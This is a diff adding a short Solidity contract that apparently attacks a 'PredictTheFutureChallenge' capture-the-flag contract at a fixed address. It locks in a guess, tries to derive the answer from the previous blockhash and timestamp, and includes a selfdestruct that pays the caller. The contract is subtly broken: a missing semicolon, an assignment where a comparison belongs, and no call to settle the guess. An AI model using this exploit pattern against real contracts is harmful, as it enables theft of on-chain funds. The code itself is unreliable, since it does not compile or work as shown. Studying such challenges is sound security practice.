@@ -1,0 +1,23 @@
+pragma solidity ^0.4.21;
+
+contract FuturePredictorSolver{
+  uint8 guessLocked = 3;
+  address contractToExploit = 0x06D28F328E8a8D09CF002753Dc350872aDFce775;
+  PredictTheFutureChallenge guess = PredictTheFutureChallenge(contractToExploit);
+
+  function() payable public {
+
+  }
+
+  function destroy() public {
+    selfdestruct(msg.sender)
+  }
+
+  function guesslock() public payable {
+    guess.lockInGuess.value(msg.value)(guessLocked);
+  }
+
+  function predict() public {
+    require(guess = (uint8(keccak256(block.blockhash(block.number - 1), now)) %  10));
+  }
+}
